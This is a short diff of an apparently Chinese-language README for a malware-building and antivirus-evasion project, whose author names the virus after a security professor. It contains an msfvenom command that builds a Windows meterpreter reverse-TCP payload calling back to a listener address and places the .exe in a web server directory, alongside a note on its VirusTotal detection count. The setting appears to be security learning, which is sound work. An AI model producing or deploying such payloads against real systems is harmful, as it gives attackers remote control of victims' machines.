@@ -1,4 +1,5 @@
-#### Jimmy是教我資安的教授，我用他的名字來命名病毒(我真的很感謝他帶我踏入資安)
+#### Jimmy是教我資安的教授，我用他的名字來命名病毒
+#### (我真的很感謝他帶我踏入資安)
 
 #### [Case 1: (55) Detected on virustotal] only msfvenom
     1_[kali]#> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.246 LPORT=8888 -f exe > /var/www/html/jimmy1.exe
